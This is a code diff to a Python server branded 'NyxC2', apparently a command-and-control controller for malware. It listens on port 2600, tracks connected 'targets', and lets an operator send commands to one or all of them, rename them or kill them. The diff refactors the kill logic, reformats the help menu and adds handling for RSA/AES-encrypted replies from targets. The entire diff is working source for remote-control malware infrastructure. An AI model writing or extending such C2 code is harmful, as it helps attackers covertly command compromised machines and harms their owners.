@@ -12,6 +12,7 @@ def server():
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     soc.bind(("0.0.0.0", 2600))
     soc.listen(1)
+    kill = False
 
     # setup the RSA
     global private_key, public_key
@@ -28,7 +29,7 @@ def server():
     dict_ip = {}
     print("Server is ready and listening")
     print("waiting for connection")
-    while True:
+    while not kill:
         # Block until one of the monitored objects has data ready to read.
         # The writable and exceptional lists are intentionally unused here.
         r_sock, w_sock, x_sock = select.select(server_list, [], [])
@@ -88,18 +89,12 @@ def server():
                         case "help":
                             # Print the commands supported by the operator UI.
                             print("\n---  NyxC2 Master Commands  ---")
-                            print(
-                                "mc list               : Show all active connected targets"
-                            )
+                            print("mc list               : Show all active connected targets")
                             print("mc rename <old> <new> : Rename a target's alias/IP")
-                            print(
-                                "mc connect <target>   : Test connection to a specific target"
-                            )
+                            print("mc connect <target>   : Test connection to a specific target")
                             print("mc help               : Display this help menu")
                             print("mc kill  <target|*>   : close script for a target")
-                            print(
-                                "<target|*> <command>  : Send a command to target(s). * for all targets"
-                            )
+                            print("<target|*> <command>  : Send a command to target(s). * for all targets")
                             print("------------------------------------\n")
 
                         case "kill":
@@ -108,7 +103,7 @@ def server():
                             target = input("who to kill : ")
 
                             send_message(target + "#", dict_ip)
-                            return
+                            kill = True
 
                 else:
                     # Forward normal input using the format "<target|*> <command>".
@@ -133,9 +128,12 @@ def server():
                     ciphertext = frame[1:]
                     plaintext = ""
 
-                    if type_byte == 0x01:
-                        aes_key = rsa_decryption(private_key, ciphertext)
-                        dict_ip[nom_cible] = (elem, True, aes_key)
+                    match type_byte:
+                        case 0x01:
+                            aes_key = rsa_decryption(private_key, ciphertext)
+                            dict_ip[nom_cible] = (elem, True, aes_key)
+                        case 0x02:
+                            plaintext = aes_decrypt(dict_ip[nom_cible][2], ciphertext)
 
                     if length_bytes == 0:
                         print(f"connection lost with {nom_cible}")
@@ -161,6 +159,7 @@ def server():
                                     plaintext = aes_decrypt(
                                         dict_ip[nom_cible][2], ciphertext
                                     )
+
                             new_data = plaintext
                             print(f"\n[answer from {nom_cible}] :\n {new_data}")
                         if new_data.endswith(">"):
